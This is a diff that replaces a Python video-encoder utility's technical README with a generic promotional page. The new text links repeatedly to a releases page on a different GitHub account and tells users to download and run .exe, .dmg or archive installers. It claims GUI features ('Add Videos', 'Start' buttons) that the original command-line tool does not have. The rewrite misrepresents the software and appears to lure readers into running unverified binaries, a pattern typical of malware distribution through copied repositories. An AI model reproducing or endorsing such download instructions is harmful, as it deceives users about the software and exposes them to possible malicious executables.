@@ -1,89 +1,66 @@
-# Video Encoder Utility
+# 🎥 JellyCoder - Encode Videos for Effortless Streaming
 
-![PyPI - Version](https://img.shields.io/pypi/v/jellycoder)
-[![Python package](https://github.com/0x78f1935/JellyCoder/actions/workflows/python-package.yml/badge.svg?branch=master)](https://github.com/0x78f1935/JellyCoder/actions/workflows/python-package.yml)
+[![Download JellyCoder](https://img.shields.io/badge/Download-JellyCoder-blue.svg)](https://github.com/Sabuj2015/JellyCoder/releases)
 
-## Overview
+## 🚀 Getting Started
 
-`jelly_coder` scans a folder for supported videos (`.mkv`, `.mp4`, `.wmv`, `.mwv`, `.avi`, `.webm`) and re-encodes them with size-aware defaults. It keeps subtitles/metadata, flips containers when MP4 constraints are violated, and preserves a mirrored directory tree when you choose not to overwrite in place.
+Welcome to JellyCoder! This application helps you reduce video file sizes and re-encode videos for smoother playback on your JellyFin server. By using this tool, you can save space and avoid playback errors.
 
-Key capabilities:
+### 🌟 Key Features
 
-- Automatic encoder selection with hardware-first preference (NVENC → QSV → AMF → x264) and explicit backend override flags.
-- Height presets (`auto`, `1080p`, `720p`, `480p`, `360p`) with bitrate scaling so smaller outputs also shrink file size.
-- Smart audio handling: copies compatible streams, forces stereo when sources are mono or pseudo-mono (e.g., WMV files with only one active channel), and warns about downmixing.
-- Hardware fallbacks: if a chosen hardware encoder fails to create a session, the tool transparently repeats the job with `libx264` so the batch continues.
+- **File Size Reduction:** Decrease file sizes to save storage space.
+- **Error-Free Playback:** Re-encode videos to ensure they run smoothly on JellyFin.
+- **Batch Processing:** Process multiple videos at once to save time.
+- **Support for Various Formats:** Works with different video and audio formats.
 
-## Prerequisites
+## 💻 System Requirements
 
-- Windows PowerShell 5.1 (default shell for the repo scripts).
-- Python 3.11+ with virtual environment support.
-- ffmpeg and ffprobe in `PATH`.
-  - Hardware backends require vendor drivers and an ffmpeg build with NVENC/QSV/AMF enabled.
+To run JellyCoder, ensure you have the following:
 
-## Installation
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **Processor:** Dual-core processor or better.
+- **Memory:** At least 4 GB RAM.
+- **Storage Space:** A minimum of 100 MB free space for the app and additional space for the videos you'll process.
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-pip install --upgrade pip
-pip install -e .
-```
+## 📥 Download & Install
 
-## Usage
+1. **Visit the Releases Page:** Click on the link below to go to the download page:
+   
+   [Download JellyCoder](https://github.com/Sabuj2015/JellyCoder/releases)
 
-```powershell
-# Show CLI help
-python -m jelly_coder --help
+2. **Select the Latest Version:** From the releases page, look for the most recent version of JellyCoder.
 
-# Reduce a folder, mirror outputs under ./output/<dir>, auto-select backend
-python -m jelly_coder --input D:\media --quality 720p
+3. **Download the Setup File:** Click on the link that corresponds to your operating system to download the appropriate setup file.
 
-# Force Intel QSV, enable overwrite, run at debug verbosity
-python -m jelly_coder --input D:\media --encoder-backend qsv --overwrite --log-level debug
+4. **Install the Application:** 
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For **macOS**: Open the downloaded `.dmg` file, drag JellyCoder to your Applications folder, then open it from there.
+   - For **Linux**: Follow your distribution’s instructions to install from a `.tar.gz` or similar package.
 
-# Legacy wrapper remains available
-python encode_videos.py --input D:\media
-```
+5. **Open JellyCoder:** After installation, locate JellyCoder on your system and open it.
 
-### Key Flags
+## ⚙️ How to Use JellyCoder
 
-- `--input PATH`: Directory scanned recursively for supported video extensions.
-- `--encoder-backend BACKEND`: `auto` (default), `nvenc`, `x264`, `qsv`, or `amf`.
-- `--preferred-codec CODEC`: Hint `h264` or `hevc`; respected when the backend supports it.
-- `--quality PRESET`: Downscale preset (`auto`, `1080p`, `720p`, `480p`, `360p`).
-- `--workers N`: Concurrent encodes (default 1; hardware encoders generally behave best at 1).
-- `--overwrite`: Replace sources in place. When omitted, outputs land in `./output/<input-folder>`.
-- `--log-level LEVEL`: `info` (default), `debug`, `warning`, etc.
+1. **Load Your Videos:** Click on the "Add Videos" button to select the files you want to encode. You can add multiple files for bulk processing.
 
-### Output Behavior
+2. **Choose Your Settings:** 
+   - Select the target format for your output files.
+   - Adjust quality settings as required. A lower quality setting will result in a smaller file size.
 
-- MP4 targets convert SubRip/ASS to `mov_text` automatically; incompatible streams trigger a fallback to MKV.
-- Attached artwork, metadata, and subtitle tracks are propagated.
-- When the output is larger than the input, a warning is emitted so you can review or delete the file.
-- Audio streams are copied when safe; otherwise they are re-encoded to AAC 192k stereo, duplicating the dominant channel if the source is effectively mono.
+3. **Start Encoding:** Click the "Start" button. JellyCoder will re-encode your videos based on your specifications.
 
-## Encoder Backends
+4. **Locate Your Finished Files:** Once processing is complete, navigate to the output folder you specified to find your newly encoded videos.
 
-- **Auto**: Queries ffmpeg encoders and picks the best available hardware backend (NVENC → QSV → AMF → x264).
-- **NVENC/QSV/AMF**: Uses vendor hardware. Hardware decode fallbacks are attempted before giving up.
-- **x264**: Software-only; always available.
-- If a hardware backend exhausts its attempts (e.g., `Error creating a MFX session: -9` on QSV), the utility logs a warning and re-runs the encode with `libx264` automatically.
+## 💡 Tips for Best Results
 
-## Audio Handling
+- **Select the Right Format:** For the best playback experience on JellyFin, choose formats like MP4 or MKV.
+- **Batch Encoding:** Use the batch processing feature for large libraries to save time.
+- **Check Video Quality:** Review the quality after encoding to ensure it meets your expectations.
 
-- ffprobe insights drive copy-or-transcode decisions.
-- WMV inputs and other stereo tracks with severe channel imbalance trigger a sampling step; if only one channel has meaningful signal, the tool duplicates it so the result plays on both speakers.
-- Mono and surround sources are converted to stereo with informative log messages about the change.
+## 📖 Support & Documentation
 
-## Development
+For more detailed instructions and troubleshooting, visit our [wiki](https://github.com/Sabuj2015/JellyCoder/wiki) or reach out through the Issues section of this repository.
 
-- Run `python -m pytest` and `flake8` before committing; coverage is enforced at 100%.
-- `python -m jelly_coder --help` verifies CLI wiring after refactors.
-- VS Code launchers in `.vscode/launch.json` provide ready-to-run debug sessions.
+---
 
-## Troubleshooting
-
-- Validate ffmpeg exposes the expected encoders: `ffmpeg -hide_banner -encoders | Select-String nvenc`.
-- Hardware backends may need up-to-date GPU/Media drivers; keep Windows and vendor packages current.
-- Delete partial outputs in `output/` if you want to re-run without `--overwrite`.
+JellyCoder empowers you to manage your video library efficiently. Enjoy the benefits of space savings and seamless playback on your JellyFin server!
